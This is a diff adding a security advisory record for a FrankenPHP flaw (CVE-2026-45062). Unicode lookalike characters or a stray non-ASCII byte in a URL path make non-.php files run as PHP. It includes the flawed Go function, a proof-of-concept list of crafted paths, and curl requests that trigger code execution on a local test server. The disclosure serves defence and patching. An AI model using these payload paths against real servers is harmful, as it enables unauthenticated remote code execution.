@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-3g8v-8r37-cgjm",
+  "modified": "2026-05-15T17:16:20.266408Z",
+  "published": "2026-05-15T17:09:46Z",
+  "aliases": [
+    "CVE-2026-45062"
+  ],
+  "summary": "FrankenPHP: Unsafe Unicode Handling in CGI Path Splitting Allows Execution of Non-PHP Files",
+  "details": "### Summary\n\nThe `splitPos()` function in [`cgi.go`](https://github.com/php/frankenphp/blob/main/cgi.go) misuses `golang.org/x/text/search` with `search.IgnoreCase` when the request path contains a non-ASCII byte. Two distinct flaws in that fallback let an attacker mislead FrankenPHP into treating a non-`.php` file as a `.php` script. In any deployment where the attacker can place content into a file served by FrankenPHP (uploads, file storage, etc.), this can be escalated to remote code execution by crafting a URL whose path triggers either flaw.\n\nThis advisory consolidates two independent reports against the same function (the duplicate, GHSA-v4h7-cj44-8fc8, has been closed). Both were reported by @KC1zs4.\n\n### Details\n\n```go\nvar splitSearchNonASCII = search.New(language.Und, search.IgnoreCase)\n\nfunc splitPos(path string, splitPath []string) int {\n\tif len(splitPath) == 0 {\n\t\treturn 0\n\t}\n\tpathLen := len(path)\n\tfor _, split := range splitPath {\n\t\tsplitLen := len(split)\n\t\tfor i := 0; i \u003c pathLen; i++ {\n\t\t\tif path[i] \u003e= utf8.RuneSelf {\n\t\t\t\tif _, end := splitSearchNonASCII.IndexString(path, split); end \u003e -1 {\n\t\t\t\t\treturn end\n\t\t\t\t}\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif i+splitLen \u003e pathLen {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tmatch := true\n\t\t\tfor j := 0; j \u003c splitLen; j++ {\n\t\t\t\tc := path[i+j]\n\t\t\t\tif c \u003e= utf8.RuneSelf {\n\t\t\t\t\tif _, end := splitSearchNonASCII.IndexString(path, split); end \u003e -1 {\n\t\t\t\t\t\treturn end\n\t\t\t\t\t}\n\t\t\t\t\tbreak // \u003c-- flaw 1: 'match' is still true\n\t\t\t\t}\n\t\t\t\tif 'A' \u003c= c \u0026\u0026 c \u003c= 'Z' {\n\t\t\t\t\tc += 'a' - 'A'\n\t\t\t\t}\n\t\t\t\tif c != split[j] {\n\t\t\t\t\tmatch = false\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t\tif match {\n\t\t\t\treturn i + splitLen\n\t\t\t}\n\t\t}\n\t}\n\treturn -1\n}\n```\n\n#### Flaw 1 — Control-flow: stale `match` after inner non-ASCII fallback\n\nIn the inner `for j` loop, when a byte satisfies `c \u003e= utf8.RuneSelf` and `splitSearchNonASCII.IndexString(...)` returns `-1`, the loop `break`s without setting `match = false`. The outer code then evaluates `if match { return i + splitLen }` with `match` still `true`, returning a position as if `.php` had been matched. The script-name suffix actually present at that offset is whatever bytes the attacker chose, so a file named `name.\u003cU+00A1\u003e.txt` gets routed as PHP.\n\n#### Flaw 2 — Unicode equivalence: `search.IgnoreCase` folds non-ASCII lookalikes onto ASCII\n\n`search.New(language.Und, search.IgnoreCase)` performs Unicode equivalence matching (compatibility decomposition + case folding), which goes far beyond the ASCII-only case folding the surrounding code is built for. Many code points fold onto ASCII `.`, `p`, `h`, `p`, so a path containing `﹒php`, `．php`, `.ｐhp`, `.ⓟⓗⓟ`, `.𝗽𝗵𝗽`, `.𝓅𝒽𝓅`, `.𝖕𝖍𝖕`, etc. is reported as `.php`.\n\nBoth flaws share the same root cause: invoking `search.IgnoreCase` to match an ASCII-only, validated-lower-case split entry against an arbitrary path. `WithRequestSplitPath` already guarantees every entry is ASCII and lower-cased, so any byte `\u003e= utf8.RuneSelf` in the path can never be part of a legitimate match — but the fallback ignored that guarantee.\n\n### PoC\n\nStandalone reproducer (copy `splitPos` from `cgi.go` verbatim, plus the imports):\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unicode/utf8\"\n\n\t\"golang.org/x/text/language\"\n\t\"golang.org/x/text/search\"\n)\n\nvar splitSearchNonASCII = search.New(language.Und, search.IgnoreCase)\n\n// ... splitPos copied verbatim from cgi.go ...\n\nfunc main() {\n\tsplit := []string{\".php\"}\n\tpayloads := []string{\n\t\t// flaw 1\n\t\t\"/PoC-match-unset.txt\",   // expected: -1\n\t\t\"/PoC-match-unset.¡.txt\", // expected: -1, actual: 20\n\n\t\t// flaw 2\n\t\t\"/shell﹒php\",          // ﹒ small full stop\n\t\t\"/shell．php\",          // ． fullwidth full stop\n\t\t\"/shell.ｐhp\",          // ｐ fullwidth p\n\t\t\"/shell.pｈp\",          // ｈ fullwidth h\n\t\t\"/shell.ⓟⓗⓟ\",                 // ⓟⓗⓟ circled\n\t\t\"/shell.\\U0001D5FD\\U0001D5F5\\U0001D5FD\",     // 𝗽𝗵𝗽 mathematical sans-serif bold\n\t\t\"/shell.\\U0001D4C5\\U0001D4BD\\U0001D4C5\",     // 𝓅𝒽𝓅 mathematical script\n\t\t\"/shell.ⓟⓗⓟ.anything-after-payload.php\",\n\t}\n\tfor _, p := range payloads {\n\t\tfmt.Printf(\"%-50s : %d\\n\", p, splitPos(p, split))\n\t}\n}\n```\n\nRun `go run poc.go`:\n\n```text\n/PoC-match-unset.txt                               : -1\n/PoC-match-unset.¡.txt                             : 20\n/shell﹒php                                        : 12\n/shell．php                                        : 12\n/shell.ｐhp                                         : 12\n/shell.pｈp                                         : 12\n/shell.ⓟⓗⓟ                                          : 16\n/shell.𝗽𝗵𝗽                                          : 19\n/shell.𝓅𝒽𝓅                                          : 19\n/shell.ⓟⓗⓟ.anything-after-payload.php               : 16\n```\n\nEvery value other than `-1` is a wrong answer: `splitPos` claims `.php` was matched at the printed offset, so `SCRIPT_FILENAME` is set to the corresponding non-PHP file (which PHP then loads and executes).\n\n#### End-to-end demo\n\nDirectory layout:\n\n```\n.\n├── Caddyfile          # `:8080 { root * /app/public; php }`\n└── public/\n    ├── index.php\n    ├── poc-match-unset.¡.   # contains \u003c?php echo \"marker=flaw1\\n\"; ?\u003e\n    └── poc-search-norm.𝗽𝗵𝗽  # contains \u003c?php echo \"marker=flaw2\\n\"; ?\u003e\n```\n\n```bash\ndocker run --rm -d --name frankenphp-poc \\\n  -p 18080:8080 \\\n  -v \"$(pwd)/Caddyfile:/etc/frankenphp/Caddyfile:ro\" \\\n  -v \"$(pwd)/public:/app/public\" \\\n  dunglas/frankenphp:latest\n\n# baseline (correctly fails to map a .txt or non-php file to PHP)\ncurl -i --path-as-is \"http://127.0.0.1:18080/poc-match-unset.txt/trigger\"\ncurl -i --path-as-is \"http://127.0.0.1:18080/poc-search-norm/trigger\"\n\n# flaw 1 — runs poc-match-unset.¡. as PHP\ncurl -i --path-as-is \"http://127.0.0.1:18080/poc-match-unset.%C2%A1.txt/trigger\"\n\n# flaw 2 — runs poc-search-norm.𝗽𝗵𝗽 as PHP\ncurl -i --path-as-is \"http://127.0.0.1:18080/poc-search-norm.%F0%9D%97%BD%F0%9D%97%B5%F0%9D%97%BD.anything-after-payload.php/trigger\"\n```\n\nBoth crafted requests respond with the marker payload from the non-`.php` file, confirming arbitrary code execution through the body of attacker-controlled files.\n\n### Impact\n\nComparable in shape to [CVE-2026-24895](https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38) but with a stricter precondition: the attacker needs the ability to place content into a file whose name matches one of the bypass patterns (the Unicode lookalike forms or a name containing a non-ASCII byte after a `.`). Where that precondition holds — common in upload endpoints, user-content stores, package mirrors, etc. — the bypass yields RCE in the FrankenPHP process via a single crafted URL, without authentication, over the network. CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H — High (8.1).\n\n### Patch\n\nBoth flaws share a single fix: drop the `golang.org/x/text/search` fallback entirely and treat any byte `\u003e= utf8.RuneSelf` in the path as a non-match. Split entries are validated ASCII-only and lower-cased upstream, so this preserves correct behavior for every legitimate path while making the Unicode bypasses unrepresentable. The replacement is a tight byte loop with no library calls in the hot path.\n\n### Credit\n\nBoth flaws were reported by @KC1zs4.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/dunglas/frankenphp",
+        "purl": "pkg:golang/github.com/dunglas/frankenphp"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.11.2"
+            },
+            {
+              "fixed": "1.12.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.12.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-3g8v-8r37-cgjm/GHSA-3g8v-8r37-cgjm.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/php/frankenphp/commit/2d0f480329a02571d6f635dad9fdb066e1a11e81"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/php/frankenphp"
+    }
+  ]
+}
